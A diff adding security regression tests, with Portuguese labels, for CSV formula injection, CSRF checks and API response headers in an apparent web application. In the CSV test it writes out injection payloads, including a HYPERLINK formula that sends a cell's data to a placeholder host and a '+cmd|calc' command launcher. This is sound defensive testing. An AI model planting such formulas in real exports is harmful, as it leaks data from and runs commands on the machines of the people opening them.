@@ -167,3 +167,42 @@ test('AUD-004/003: mudar papel, status ou senha exige confirmação e revoga as 
   assert.equal((await call('PATCH', `/users/${op2}`, { role: 'admin', confirmPassword: 'senha-super-segura' }, admin)).status, 200);
   assert.equal((await call('GET', '/auth/me', undefined, c2)).status, 401);
 });
+
+// ---------- AUD-007: injeção de fórmula em CSV ----------
+test('AUD-007: células iniciadas por = + - @ são neutralizadas; números e escapes preservados', async () => {
+  const { csvCell } = await import('../src/format.ts');
+  assert.equal(csvCell('=HYPERLINK("http://exemplo.invalido/"&A2;"x")'), `"'=HYPERLINK(""http://exemplo.invalido/""&A2;""x"")"`);
+  assert.equal(csvCell('@SUM(1+1)'), "'@SUM(1+1)");
+  assert.equal(csvCell('+cmd|calc'), "'+cmd|calc");
+  assert.equal(csvCell('-2+3'), "'-2+3");
+  assert.equal(csvCell('\t=1+1'), "'\t=1+1");
+  assert.equal(csvCell('-12,50'), '-12,50');
+  assert.equal(csvCell(-3.5), '-3.5');
+  assert.equal(csvCell('11987654321'), '11987654321');
+  assert.equal(csvCell('Maria; Silva'), '"Maria; Silva"');
+  assert.equal(csvCell('Obra "A"'), '"Obra ""A"""');
+});
+
+// ---------- AUD-014: CSRF ----------
+test('AUD-014: mutações sem o cabeçalho do front ou vindas de outro site são recusadas', async () => {
+  await addUser('csrf@x.com', 'Csrf', 'admin');
+  const cookie = await login('csrf@x.com', 'senha-super-segura', ipHeader('10.5.0.1'));
+  const noHeader = await call('POST', '/auth/logout', {}, cookie, { 'x-requested-with': '' });
+  assert.equal(noHeader.status, 403);
+  assert.equal(noHeader.data.code, 'CSRF');
+  const cross = await call('DELETE', '/lines/00000000-0000-0000-0000-000000000000', undefined, cookie, { 'sec-fetch-site': 'cross-site' });
+  assert.equal(cross.status, 403);
+  const sameSite = await call('DELETE', '/lines/00000000-0000-0000-0000-000000000000', undefined, cookie, { 'sec-fetch-site': 'same-site' });
+  assert.equal(sameSite.status, 403);
+  const ok = await call('DELETE', '/lines/00000000-0000-0000-0000-000000000000', undefined, cookie, { 'sec-fetch-site': 'same-origin' });
+  assert.equal(ok.status, 404); // passou pela barreira (linha inexistente)
+  assert.equal((await call('GET', '/auth/me', undefined, cookie, { 'x-requested-with': '' })).status, 200); // GET não exige
+});
+
+// ---------- AUD-017: cabeçalhos da API ----------
+test('AUD-017: respostas da API levam nosniff e demais cabeçalhos', async () => {
+  const r = await call('GET', '/auth/me');
+  assert.equal(r.headers.get('x-content-type-options'), 'nosniff');
+  assert.equal(r.headers.get('cache-control'), 'no-store');
+  assert.equal(r.headers.get('cross-origin-resource-policy'), 'same-origin');
+});
